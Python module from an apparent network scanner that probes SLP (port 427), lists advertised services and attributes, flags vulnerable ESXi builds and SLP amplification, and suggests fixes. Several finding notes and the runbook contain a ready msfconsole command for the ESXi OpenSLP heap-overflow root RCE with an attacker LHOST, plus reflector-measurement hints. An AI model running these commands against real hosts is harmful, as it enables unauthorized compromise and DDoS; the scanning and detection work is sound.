"""SLP (Service Location Protocol, RFC 2608) — 427/udp+tcp.

SLPv2 speakers publish a catalogue of every network service on the segment:
service types (service:vmware-infrastructure, service:printer, service:cifs,
service:nfs, service:jetdirect, ...), the URLs each is reachable at, and
per-URL attributes (product/version/uuid/managementserver/...). Almost every
deployment leaves this readable without authentication — one SrvTypeRqst plus
one SrvRqst plus one AttrRqst pulls the whole service map.

Two exposure stories on top of the disclosure:

  * ESXi OpenSLP RCE (CVE-2021-21974 / CVE-2019-5544 / CVE-2020-3992). When
    AttrRqst returns a VMware ESXi product line with a build number that
    predates the vendor's fix line, recce flags the RCE with a concrete build
    citation. When only the product string is visible, recce flags the CWE
    class without asserting a CVE.
  * SLPReflector amplification (CVE-2023-29552, KEV 2023). Any 427/udp
    responder answering unauth AttrRqst can be used as a UDP reflector with
    a BAF of up to ~2200x. Flagged regardless of vendor.

Airgap-safe: stdlib socket + struct only. Every I/O bounded by proxy.scaled().
Wire format from RFC 2608 §8 (header), §10 (SrvRqst/SrvRply, SrvTypeRqst/Rply,
AttrRqst/AttrRply), §8.5 (DAAdvert).
"""
from __future__ import annotations

import re
import socket
import struct

from ..core import proxy
from ..core.models import Host, Port


_DEFAULT_PORT = 427
_MULTICAST_ADDR = "239.255.255.253"
_TIMEOUT = 3.0

_SLP_V2 = 2

_FID_SRVRQST = 1
_FID_SRVRPLY = 2
_FID_ATTRRQST = 6
_FID_ATTRRPLY = 7
_FID_DAADVERT = 8
_FID_SRVTYPERQST = 9
_FID_SRVTYPERPLY = 10

_FLAG_OVERFLOW = 0x8000
_FLAG_FRESH = 0x4000
_FLAG_MCAST = 0x2000

# ESXi build lines that fix CVE-2021-21974 (VMSA-2021-0002). A parsed ESXi
# build strictly less than the fix line for its major.minor is flagged.
_ESXI_FIX_BUILDS = {
    "6.5": 17477841,   # ESXi650-202102101-SG
    "6.7": 17499825,   # ESXi670-202102401-SG
    "7.0": 17325551,   # ESXi70U1c-17325551
}


def is_slp(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == 427
            or svc in ("slp", "svrloc") or "slp" in prod or "openslp" in prod)


# --- SLPv2 wire ------------------------------------------------------------

def _slp_header(fid: int, body_len: int, xid: int, flags: int = 0,
                lang: bytes = b"en") -> bytes:
    """RFC 2608 §8 message header. Length is total (header + body).
    24-bit fields (length, next-ext-offset) are big-endian 3-byte packs."""
    total = 14 + len(lang) + body_len
    length_hi = (total >> 16) & 0xff
    length_lo = total & 0xffff
    next_ext = 0
    ne_hi = (next_ext >> 16) & 0xff
    ne_lo = next_ext & 0xffff
    return (struct.pack("!BBBH", _SLP_V2, fid, length_hi, length_lo)
            + struct.pack("!HBH", flags, ne_hi, ne_lo)
            + struct.pack("!HH", xid, len(lang))
            + lang)


def _lstr(s: str | bytes) -> bytes:
    """2-byte length-prefixed string (§8)."""
    b = s.encode("utf-8") if isinstance(s, str) else s
    return struct.pack("!H", len(b)) + b


def _build_srvtyperqst(xid: int, scope: str = "DEFAULT",
                       naming_authority: str | None = None,
                       prlist: str = "") -> bytes:
    """SrvTypeRqst (§10.1). naming_authority=None means the 0xFFFF ('all')
    marker; empty string means IANA (implicit); any other string is literal."""
    if naming_authority is None:
        na = b"\xff\xff"
    else:
        na = _lstr(naming_authority)
    body = _lstr(prlist) + na + _lstr(scope)
    return _slp_header(_FID_SRVTYPERQST, len(body), xid) + body


def _build_srvrqst(xid: int, service_type: str, scope: str = "DEFAULT",
                   prlist: str = "", predicate: str = "",
                   spi: str = "", multicast: bool = False) -> bytes:
    """SrvRqst (§8.1). Multicast form sets the R flag."""
    body = (_lstr(prlist) + _lstr(service_type) + _lstr(scope)
            + _lstr(predicate) + _lstr(spi))
    flags = _FLAG_MCAST if multicast else 0
    return _slp_header(_FID_SRVRQST, len(body), xid, flags=flags) + body


def _build_attrrqst(xid: int, url: str, scope: str = "DEFAULT",
                    tags: str = "", prlist: str = "", spi: str = "") -> bytes:
    """AttrRqst (§10.3). Empty tags returns ALL attributes."""
    body = (_lstr(prlist) + _lstr(url) + _lstr(scope)
            + _lstr(tags) + _lstr(spi))
    return _slp_header(_FID_ATTRRQST, len(body), xid) + body


def _parse_header(pkt: bytes) -> dict | None:
    if len(pkt) < 14:
        return None
    if pkt[0] != _SLP_V2:
        return None
    fid = pkt[1]
    length = (pkt[2] << 16) | struct.unpack_from("!H", pkt, 3)[0]
    flags = struct.unpack_from("!H", pkt, 5)[0]
    xid = struct.unpack_from("!H", pkt, 10)[0]
    lang_len = struct.unpack_from("!H", pkt, 12)[0]
    if 14 + lang_len > len(pkt):
        return None
    lang = pkt[14:14 + lang_len].decode("ascii", "replace")
    return {"version": _SLP_V2, "fid": fid, "length": length, "flags": flags,
            "xid": xid, "lang": lang, "body_offset": 14 + lang_len}


def _read_lstr(pkt: bytes, off: int) -> tuple[str, int] | None:
    if off + 2 > len(pkt):
        return None
    n = struct.unpack_from("!H", pkt, off)[0]
    off += 2
    if off + n > len(pkt):
        return None
    return pkt[off:off + n].decode("utf-8", "replace"), off + n


def _parse_srvtyperply(pkt: bytes) -> dict:
    out: dict = {"error": None, "types": []}
    hdr = _parse_header(pkt)
    if not hdr or hdr["fid"] != _FID_SRVTYPERPLY:
        return out
    off = hdr["body_offset"]
    if off + 2 > len(pkt):
        return out
    err = struct.unpack_from("!H", pkt, off)[0]
    off += 2
    out["error"] = err
    if err != 0:
        return out
    read = _read_lstr(pkt, off)
    if read is None:
        return out
    types_str, _ = read
    out["types"] = [t for t in types_str.split(",") if t]
    return out


def _parse_url_entry(pkt: bytes, off: int) -> tuple[dict, int] | None:
    """URL Entry (§4.3): Reserved(1) Lifetime(2) URLLen(2) URL AuthCount(1)
    then AuthCount * auth-blocks. We skip auth-block bodies (§9)."""
    if off + 6 > len(pkt):
        return None
    _reserved = pkt[off]
    lifetime = struct.unpack_from("!H", pkt, off + 1)[0]
    url_len = struct.unpack_from("!H", pkt, off + 3)[0]
    off += 5
    if off + url_len + 1 > len(pkt):
        return None
    url = pkt[off:off + url_len].decode("utf-8", "replace")
    off += url_len
    auth_count = pkt[off]
    off += 1
    for _ in range(auth_count):
        # Auth block: BSD(2) BlockLen(2) ... Fixed 10-byte header + variable.
        if off + 4 > len(pkt):
            return None
        _bsd = struct.unpack_from("!H", pkt, off)[0]
        block_len = struct.unpack_from("!H", pkt, off + 2)[0]
        if block_len < 4 or off + block_len > len(pkt):
            return None
        off += block_len
    return {"url": url, "lifetime": lifetime, "auth_blocks": auth_count}, off


def _parse_srvrply(pkt: bytes) -> dict:
    out: dict = {"error": None, "urls": []}
    hdr = _parse_header(pkt)
    if not hdr or hdr["fid"] != _FID_SRVRPLY:
        return out
    off = hdr["body_offset"]
    if off + 4 > len(pkt):
        return out
    err = struct.unpack_from("!H", pkt, off)[0]
    count = struct.unpack_from("!H", pkt, off + 2)[0]
    off += 4
    out["error"] = err
    if err != 0:
        return out
    for _ in range(count):
        parsed = _parse_url_entry(pkt, off)
        if parsed is None:
            break
        entry, off = parsed
        out["urls"].append(entry)
    return out


def _parse_attrrply(pkt: bytes) -> dict:
    out: dict = {"error": None, "attrs_raw": "", "attrs": {}, "auth_blocks": 0}
    hdr = _parse_header(pkt)
    if not hdr or hdr["fid"] != _FID_ATTRRPLY:
        return out
    off = hdr["body_offset"]
    if off + 2 > len(pkt):
        return out
    err = struct.unpack_from("!H", pkt, off)[0]
    off += 2
    out["error"] = err
    if err != 0:
        return out
    read = _read_lstr(pkt, off)
    if read is None:
        return out
    attrs_raw, off = read
    out["attrs_raw"] = attrs_raw
    out["attrs"] = _parse_attr_list(attrs_raw)
    if off < len(pkt):
        out["auth_blocks"] = pkt[off]
    return out


def _parse_daadvert(pkt: bytes) -> dict:
    out: dict = {"error": None, "url": "", "scope": "", "attrs_raw": "",
                 "boot_time": 0}
    hdr = _parse_header(pkt)
    if not hdr or hdr["fid"] != _FID_DAADVERT:
        return out
    off = hdr["body_offset"]
    if off + 6 > len(pkt):
        return out
    err = struct.unpack_from("!H", pkt, off)[0]
    boot = struct.unpack_from("!I", pkt, off + 2)[0]
    off += 6
    out["error"] = err
    out["boot_time"] = boot
    if err != 0:
        return out
    for key in ("url", "scope", "attrs_raw"):
        read = _read_lstr(pkt, off)
        if read is None:
            return out
        val, off = read
        out[key] = val
    return out


# Attribute lists are comma-separated (attr) or (attr=val[,val...]) tuples per
# RFC 2608 §5. Values with commas can be escaped as \2c; a full escape-decoder
# is overkill for the scanner — we split on the top-level commas and pull the
# tag / first-value pair, keeping the raw string for the operator too.
_ATTR_TUPLE = re.compile(r"\(\s*([^=)]+?)\s*=\s*([^)]*)\)")


def _parse_attr_list(raw: str) -> dict:
    out: dict = {}
    for m in _ATTR_TUPLE.finditer(raw):
        name = m.group(1).strip()
        val = m.group(2).strip()
        if name:
            out[name] = val
    return out


# --- I/O -------------------------------------------------------------------

def _udp_exchange(ip: str, port: int, pkt: bytes, timeout: float) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(proxy.scaled(timeout))
    try:
        sock.sendto(pkt, (ip, port))
        data, _addr = sock.recvfrom(65535)
        return data
    except OSError:
        return b""
    finally:
        sock.close()


def _tcp_exchange(ip: str, port: int, pkt: bytes, timeout: float) -> bytes:
    try:
        with socket.create_connection((ip, port),
                                      timeout=proxy.scaled(timeout)) as sock:
            sock.settimeout(proxy.scaled(timeout))
            sock.sendall(pkt)
            chunks = []
            while True:
                try:
                    chunk = sock.recv(65535)
                except OSError:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(len(c) for c in chunks) > 262144:
                    break
            return b"".join(chunks)
    except OSError:
        return b""


def srvtyperqst(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
                use_tcp: bool = False, xid: int = 0x1234) -> dict:
    pkt = _build_srvtyperqst(xid)
    data = (_tcp_exchange if use_tcp else _udp_exchange)(ip, port, pkt, timeout)
    if not data:
        return {"error": None, "types": [], "raw_bytes": 0}
    out = _parse_srvtyperply(data)
    out["raw_bytes"] = len(data)
    return out


def srvrqst(ip: str, service_type: str, port: int = _DEFAULT_PORT,
            timeout: float = _TIMEOUT, use_tcp: bool = False,
            xid: int = 0x2345) -> dict:
    pkt = _build_srvrqst(xid, service_type)
    data = (_tcp_exchange if use_tcp else _udp_exchange)(ip, port, pkt, timeout)
    if not data:
        return {"error": None, "urls": [], "raw_bytes": 0}
    out = _parse_srvrply(data)
    out["raw_bytes"] = len(data)
    return out


def attrrqst(ip: str, url: str, port: int = _DEFAULT_PORT,
             timeout: float = _TIMEOUT, use_tcp: bool = False,
             xid: int = 0x3456) -> dict:
    pkt = _build_attrrqst(xid, url)
    data = (_tcp_exchange if use_tcp else _udp_exchange)(ip, port, pkt, timeout)
    if not data:
        return {"error": None, "attrs": {}, "attrs_raw": "",
                "auth_blocks": 0, "raw_bytes": 0}
    out = _parse_attrrply(data)
    out["raw_bytes"] = len(data)
    return out


# --- ESXi build gating -----------------------------------------------------

_ESXI_BUILD_RE = re.compile(r"build[-\s]?(\d{5,10})", re.I)
_ESXI_VER_RE = re.compile(r"(\d+\.\d+)(?:\.\d+)?")


def _esxi_vulnerable(product: str, version: str) -> tuple[bool, str, int, int] | None:
    """Return (vulnerable, series, build, fix_build) when the product is ESXi
    AND both version series and build are parseable AND build < fix line.
    None means: not ESXi, or version/build not parseable — DO NOT emit CVE."""
    prod_l = (product or "").lower()
    if "esxi" not in prod_l and "vmware" not in prod_l:
        return None
    combined = f"{product or ''} {version or ''}"
    ver_m = _ESXI_VER_RE.search(version or "") or _ESXI_VER_RE.search(combined)
    build_m = _ESXI_BUILD_RE.search(combined)
    if not ver_m or not build_m:
        return None
    series = ver_m.group(1)
    fix = _ESXI_FIX_BUILDS.get(series)
    if fix is None:
        return None
    build = int(build_m.group(1))
    return (build < fix, series, build, fix)


# --- probe / targets / findings -------------------------------------------

# Seed service types when SrvTypeRqst returns nothing usable (some responders
# refuse the "all naming authorities" marker but answer specific SrvRqst).
_SEED_SERVICE_TYPES = (
    "service:VMwareInfrastructure",
    "service:wbem",
    "service:directory-agent",
    "service:service-agent",
    "service:printer",
    "service:cifs",
    "service:nfs",
    "service:http",
    "service:jetdirect",
)


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          attr_max: int = 6) -> dict:
    """One SrvTypeRqst, then one SrvRqst per discovered type, then one AttrRqst
    per URL (capped at attr_max URLs across the whole probe). TCP fallback on
    UDP silence per RFC 2608 §6.3. Returns aggregated dict."""
    out: dict = {"reachable": False, "version": "", "types": [], "urls": [],
                 "attrs": {}, "attrs_raw": {}, "openslp": False,
                 "auth_blocks_seen": False, "esxi": None, "used_tcp": False,
                 "scopes": set()}
    stt = srvtyperqst(ip, port, timeout)
    used_tcp = False
    if stt.get("raw_bytes", 0) == 0:
        stt = srvtyperqst(ip, port, timeout, use_tcp=True)
        if stt.get("raw_bytes", 0) > 0:
            used_tcp = True
    if stt.get("raw_bytes", 0) > 0:
        out["reachable"] = True
        out["version"] = "2"
        out["types"] = list(stt.get("types") or [])
    out["used_tcp"] = used_tcp

    seen_types = list(out["types"])
    if not seen_types:
        seen_types = list(_SEED_SERVICE_TYPES)

    urls_seen: list[str] = []
    for st in seen_types[:16]:
        r = srvrqst(ip, st, port, timeout, use_tcp=used_tcp)
        if r.get("raw_bytes", 0) > 0:
            out["reachable"] = True
            out["version"] = "2"
        for u in r.get("urls") or []:
            url = u.get("url") or ""
            if url and url not in urls_seen:
                urls_seen.append(url)
                out["urls"].append({"url": url, "service_type": st,
                                    "lifetime": u.get("lifetime", 0),
                                    "auth_blocks": u.get("auth_blocks", 0)})
                if u.get("auth_blocks"):
                    out["auth_blocks_seen"] = True

    for entry in out["urls"][:attr_max]:
        a = attrrqst(ip, entry["url"], port, timeout, use_tcp=used_tcp)
        if a.get("raw_bytes", 0) > 0:
            out["reachable"] = True
        if a.get("auth_blocks"):
            out["auth_blocks_seen"] = True
        attrs = a.get("attrs") or {}
        if attrs:
            out["attrs"][entry["url"]] = attrs
            out["attrs_raw"][entry["url"]] = a.get("attrs_raw", "")
            blob = " ".join([entry["url"]] + [f"{k}={v}"
                                              for k, v in attrs.items()])
            if "openslp" in blob.lower():
                out["openslp"] = True
            prod = attrs.get("product") or ""
            ver = attrs.get("version") or ""
            if "esxi" in prod.lower() or "vmware" in prod.lower():
                # ESXi advertises the build as its own keyword tuple
                # "(build-NNNNN)" — no "=", so it lands in attrs_raw, not
                # attrs. Feed both to the gate so the regex sees it.
                raw = a.get("attrs_raw", "")
                v = _esxi_vulnerable(prod, f"{ver} {raw}")
                if v is not None:
                    vuln, series, build, fix = v
                    out["esxi"] = {"product": prod, "version": ver,
                                   "series": series, "build": build,
                                   "fix_build": fix, "vulnerable": vuln}

    # Scopes are advertised in SrvRply / DAAdvert; here we only see the ones
    # a responder puts inside AttrRply attribute strings ("scope=...").
    for attrs in out["attrs"].values():
        sc = attrs.get("scope") or attrs.get("scopes")
        if sc:
            for s in sc.split(","):
                s = s.strip()
                if s:
                    out["scopes"].add(s)
    out["scopes"] = sorted(out["scopes"])
    return out


def slp_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_slp(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "protocol": p.protocol or "udp",
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             cves=None, exploit_note="", depth_tier=""):
    f = {"severity": sev, "title": title, "target": target, "detail": detail,
         "tool": "slptool", "command": cmd, "remediation": rem,
         "cwes": cwes, "kind": kind,
         "exploit_note": exploit_note, "depth_tier": depth_tier}
    if cves:
        f["cves"] = cves
    return f


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_slp(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"

            out.append(_finding(
                "info",
                "SLP endpoint reachable (SLPv2 SrvTypeRqst answered)", tgt,
                f"SLPv2 responder on {tgt}"
                + (" (TCP fallback)" if pr.get("used_tcp") else "")
                + f". Advertised service types: {len(pr.get('types') or [])}, "
                f"URLs enumerated: {len(pr.get('urls') or [])}, "
                f"scopes seen: {', '.join(pr.get('scopes') or []) or '(none)'}.",
                f"slptool -u {h.ip} findsrvtypes",
                "Restrict SLP to the management network; disable on public "
                "interfaces if not required.",
                [], kind="slp_reachable",
                exploit_note="slptool -u <ip> findsrvtypes.",
                depth_tier="t0"))

            types = pr.get("types") or []
            if types:
                out.append(_finding(
                    "high",
                    "SLP service catalogue readable unauthenticated", tgt,
                    f"SrvTypeRqst returned {len(types)} advertised service "
                    f"type(s) with no authentication: "
                    f"{', '.join(types[:12])}"
                    + ("..." if len(types) > 12 else "")
                    + ". Each type maps to a follow-on SrvRqst that discloses "
                    "the URLs and (via AttrRqst) product+version attributes.",
                    f"slptool -u {h.ip} findsrvtypes",
                    "Restrict SLP to the management network or disable it. "
                    "SLPv2 authentication blocks (RFC 2608 §9) are rarely "
                    "implemented — the practical control is network isolation.",
                    ["CWE-200", "CWE-306"], kind="slp_service_catalogue",
                    exploit_note=(
                        "slptool -u <ip> findsrvtypes; for each type: slptool "
                        "-u <ip> findsrvs <type>; feed URLs into nmap -sV -Pn "
                        "<extracted_urls>."
                    ),
                    # P0-1: T2 promotion — the SrvTypeRqst reply itself is the
                    # server-side evidence (concrete enumerated service-type
                    # list, not a heuristic port-open guess). Every type name
                    # in the finding output came from the target's own reply.
                    depth_tier="t2"))

            urls = pr.get("urls") or []
            if urls:
                sample = ", ".join(u["url"] for u in urls[:6])
                out.append(_finding(
                    "medium",
                    "SLP URL enumeration discloses service endpoints", tgt,
                    f"SrvRqst returned {len(urls)} service:URL(s): {sample}"
                    + ("..." if len(urls) > 6 else "")
                    + ". Each URL carries host, port, path and often the "
                    "product tag — feeds cross-service scanners (HTTP/IPP/"
                    "SMB/NFS/LDAP/wbem/cimom).",
                    f"slptool -u {h.ip} findsrvs service:service-agent",
                    "Restrict SLP to trusted networks.",
                    ["CWE-200"], kind="slp_url_disclosure",
                    exploit_note=(
                        "slptool -u <ip> findsrvs service:service-agent; "
                        "parse each URL and enqueue for the matching "
                        "service module (HTTP/CIFS/NFS/etc.)."),
                    # P0-1: T2 promotion — SrvRqst replies contain concrete
                    # service:URL strings extracted from the target's own
                    # advertisement, not inferred from port state.
                    depth_tier="t2"))

            attrs = pr.get("attrs") or {}
            if attrs:
                sample_keys: list[str] = []
                for a in attrs.values():
                    sample_keys.extend(list(a.keys())[:3])
                    if len(sample_keys) >= 6:
                        break
                out.append(_finding(
                    "medium",
                    "SLP AttrRqst discloses per-service attributes "
                    "unauthenticated", tgt,
                    f"AttrRqst on {len(attrs)} URL(s) returned attribute "
                    f"tuples (e.g. {', '.join(sample_keys[:6])}). Common "
                    "leakage on ESXi: product, version, build, uuid, "
                    "managementserver, cimom.",
                    f"slptool -u {h.ip} findattrs "
                    "service:VMwareInfrastructure",
                    "Restrict SLP to the management network. Disable SLP on "
                    "ESXi if unused: esxcli system slp set --enable false.",
                    ["CWE-200"], kind="slp_attribute_disclosure",
                    exploit_note=(
                        "slptool -u <ip> findattrs "
                        "service:VMwareInfrastructure  # look for uuid, "
                        "managementserver, product, version, build."),
                    # P0-1: T2 promotion — AttrRqst returned parsed
                    # attribute tuples with real key/value pairs (uuid,
                    # managementserver, product, ...) — server-side content.
                    depth_tier="t2"))

            # UDP amplifier — RFC 2608 §5 UDP replies with no source
            # validation. Any 427/udp responder qualifies.
            if (p.protocol or "").lower() == "udp" and not pr.get("used_tcp"):
                out.append(_finding(
                    "high",
                    "SLP UDP amplification reflector (CVE-2023-29552, KEV)",
                    tgt,
                    f"427/udp on {h.ip} answers unauthenticated AttrRqst "
                    "with no source validation. CVE-2023-29552 (SLPReflector) "
                    "measures amplification factors up to ~2200x — an "
                    "attacker spoofing a victim's IP can use this host to "
                    "reflect DDoS traffic. Included in CISA KEV since "
                    "May 2023.",
                    f"slptool -u {h.ip} findsrvs service:service-agent",
                    "Disable SLP on public / internet-facing interfaces. "
                    "Firewall 427/udp inbound from the internet. Consider "
                    "rate-limiting 427/udp egress at the perimeter.",
                    ["CWE-406"], kind="slp_amplifier",
                    cves=["CVE-2023-29552"],
                    exploit_note=(
                        "nmap -sU -p427 --script slp-info <ip> | grep -A2 "
                        "'response'; measured BAF = response_bytes / 82. Do "
                        "NOT test spoofed egress off-lab."
                    ),
                    depth_tier="t1"))

            # DA discovery — a directory-agent URL in the enumerated list.
            da_urls = [u["url"] for u in urls
                       if "directory-agent" in u["url"].lower()
                       or u["url"].lower().startswith("service:directory-agent")]
            if da_urls:
                out.append(_finding(
                    "medium",
                    "SLP Directory Agent identified (aggregates network SAs)",
                    tgt,
                    f"Directory Agent URL(s) advertised: "
                    f"{', '.join(da_urls[:3])}. A single DA typically "
                    "aggregates every Service Agent in the scope — one "
                    "SrvRqst against the DA pulls the whole segment's "
                    "advertisements.",
                    f"slptool -u {h.ip} findsrvs service:directory-agent",
                    "Restrict DA discovery to trusted networks; if a DA is "
                    "public it multiplies the disclosure surface.",
                    ["CWE-200"], kind="slp_directory_agent",
                    exploit_note=(
                        "slptool -u <da_ip> findsrvs service:  # empty "
                        "type = all SAs registered with the DA."),
                    depth_tier="t0"))

            # ESXi build-gated CVE (the version-gate is what avoids a false
            # positive on a patched ESXi that still answers SLP).
            esxi = pr.get("esxi")
            if esxi and esxi.get("vulnerable"):
                out.append(_finding(
                    "critical",
                    "VMware ESXi OpenSLP pre-auth RCE — build-gated "
                    "(CVE-2021-21974)", tgt,
                    f"ESXi {esxi['series']} build {esxi['build']} advertised "
                    f"via SLP AttrRqst on {tgt}. Fix line for "
                    f"{esxi['series']} is build {esxi['fix_build']} "
                    "(VMSA-2021-0002); the observed build predates it. "
                    "OpenSLP heap overflow reachable pre-auth over 427/tcp. "
                    "Related: CVE-2019-5544 (heap overflow, Metasploit "
                    "module), CVE-2020-3992 (UAF).",
                    f"# do NOT invoke on prod — MSF ref: "
                    f"exploit/multi/vmware/openslp_heap_overflow  "
                    f"target={h.ip}:{p.portid}",
                    "Patch to VMSA-2021-0002 fix line or later; disable SLP "
                    "on ESXi (esxcli system slp set --enable false) — VMware "
                    "shipped SLP disabled by default from 7.0 U2c onward.",
                    ["CWE-787", "CWE-416", "CWE-306"],
                    kind="slp_esxi_openslp_rce",
                    cves=["CVE-2021-21974", "CVE-2019-5544", "CVE-2020-3992"],
                    exploit_note=(
                        "msfconsole -q -x 'use exploit/multi/vmware/"
                        "openslp_heap_overflow; set RHOSTS <ip>; set LHOST "
                        "<attacker>; run'  # root RCE; do NOT run without ROE. "
                        "Also: python PoC gists exist for CVE-2019-5544."
                    ),
                    depth_tier="t1"))
            elif esxi is not None and not esxi.get("vulnerable"):
                out.append(_finding(
                    "info",
                    "ESXi build advertised via SLP appears patched", tgt,
                    f"ESXi {esxi['series']} build {esxi['build']} is at or "
                    f"above the CVE-2021-21974 fix build "
                    f"({esxi['fix_build']}).",
                    f"slptool -u {h.ip} findattrs "
                    "service:VMwareInfrastructure",
                    "Continue restricting SLP to the management network.",
                    [], kind="slp_esxi_patched",
                    exploit_note=(
                        "Continue restricting SLP to management network."),
                    depth_tier="t0"))
            elif any("vmware" in (u["url"] or "").lower()
                     or "wbem" in (u["url"] or "").lower()
                     or "cimom" in (u["url"] or "").lower() for u in urls):
                # Product string present but no parseable build — flag the
                # class (CWE only), never a CVE without the version gate.
                out.append(_finding(
                    "high",
                    "ESXi / WBEM URL advertised via SLP — review for "
                    "OpenSLP RCE", tgt,
                    "SLP advertises a VMware Infrastructure / WBEM / CIMOM "
                    "URL but the observed attributes do not carry a "
                    "parseable build number. Manually confirm the ESXi "
                    "patch level against VMSA-2021-0002; CVE-2021-21974 / "
                    "CVE-2019-5544 / CVE-2020-3992 apply to unpatched builds.",
                    f"slptool -u {h.ip} findattrs "
                    "service:VMwareInfrastructure",
                    "Patch ESXi to the VMSA-2021-0002 fix line; disable SLP "
                    "on ESXi (esxcli system slp set --enable false).",
                    ["CWE-787", "CWE-416"], kind="slp_esxi_unknown_build",
                    exploit_note=(
                        "curl -sk https://<ip>/ui/ | grep -oE 'ESXi [0-9.]+'  "
                        "# front-end sometimes carries the version; then "
                        "compare against VMSA-2021-0002."
                    ),
                    depth_tier="t0"))

            if pr.get("scopes"):
                out.append(_finding(
                    "low",
                    "SLP scope tags disclose environment structure", tgt,
                    f"Scope list carried by SLP replies: "
                    f"{', '.join(pr.get('scopes') or [])}. Scope names "
                    "routinely encode site / environment segmentation.",
                    f"slptool -u {h.ip} findscopes",
                    "Use generic scope names on public segments.",
                    ["CWE-200"], kind="slp_scope_disclosure",
                    exploit_note="slptool -u <ip> findscopes.",
                    depth_tier="t0"))

            if pr.get("auth_blocks_seen"):
                out.append(_finding(
                    "info",
                    "SLP authentication blocks observed in replies", tgt,
                    "SLPv2 authentication blocks (RFC 2608 §9) were present "
                    "in one or more replies — a strong signal of a hardened "
                    "SLP deployment.",
                    f"slptool -u {h.ip} findsrvs service:service-agent",
                    "No action.",
                    [], kind="slp_auth_present",
                    exploit_note="No action.",
                    depth_tier="t0"))
            else:
                out.append(_finding(
                    "low",
                    "SLP replies carry no authentication blocks", tgt,
                    "Every observed SLPv2 reply had zero authentication "
                    "blocks — the norm, and confirms the unauthenticated "
                    "disclosure findings above are not gated by SPI.",
                    f"slptool -u {h.ip} findsrvs service:service-agent",
                    "Restrict SLP to trusted networks.",
                    [], kind="slp_no_auth",
                    exploit_note="Restrict SLP to trusted networks.",
                    depth_tier="t1"))

            if pr.get("openslp"):
                out.append(_finding(
                    "info",
                    "OpenSLP implementation fingerprinted", tgt,
                    "Attribute strings identify the responder as OpenSLP. "
                    "OpenSLP is the codebase behind the ESXi CVE line "
                    "(CVE-2019-5544 / CVE-2020-3992 / CVE-2021-21974).",
                    f"slptool -u {h.ip} findattrs service:service-agent",
                    "Track the OpenSLP version alongside the vendor's "
                    "patch matrix.",
                    [], kind="slp_openslp_fingerprint",
                    exploit_note=(
                        "slptool -u <ip> findattrs service:service-agent  "
                        "# grep for version; compare to OpenSLP release "
                        "notes."),
                    depth_tier="t0"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    return [
        {"phase": "enumerate", "tool": "slptool",
         "command": f"slptool -u {ip} findsrvtypes",
         "why": "list every advertised service type on this SLP responder"},
        {"phase": "enumerate", "tool": "slptool",
         "command": f"slptool -u {ip} findsrvs service:service-agent",
         "why": "enumerate URLs for a specific service type"},
        {"phase": "enumerate", "tool": "slptool",
         "command": f"slptool -u {ip} findattrs "
                    "service:VMwareInfrastructure",
         "why": "pull attribute list (product/version/build/managementserver)"},
        {"phase": "enumerate", "tool": "nmap",
         "command": f"nmap -sU -p {port} --script slp-info {ip}",
         "why": "NSE slp-info wraps SrvTypeRqst+SrvRqst+AttrRqst in one call"},
        {"phase": "exploit", "tool": "review",
         "command": "# msfconsole: use exploit/multi/vmware/openslp_heap_overflow"
                    "  # CVE-2019-5544; do NOT invoke without ROE",
         "why": "ESXi OpenSLP RCE reference — a scanner should flag, not fire"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from . import svccommon
    return svccommon.findings_to_vulns(fs, "slp", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            multicast: bool = False) -> dict:
    """`multicast` is accepted for CLI parity with the punch list's
    --slp-multicast flag; the actual multicast sweep is deferred (needs a
    routing decision the caller must own — RFC 2608 §5, TTL, iface bind)."""
    from . import svcprobe
    targets = slp_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["types"] = len(pr.get("types") or [])
                t["urls"] = len(pr.get("urls") or [])
                t["esxi_vulnerable"] = bool(pr.get("esxi")
                                            and pr["esxi"].get("vulnerable"))
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "multicast_requested": multicast,
                      "stopped": state.get("stopped")}}
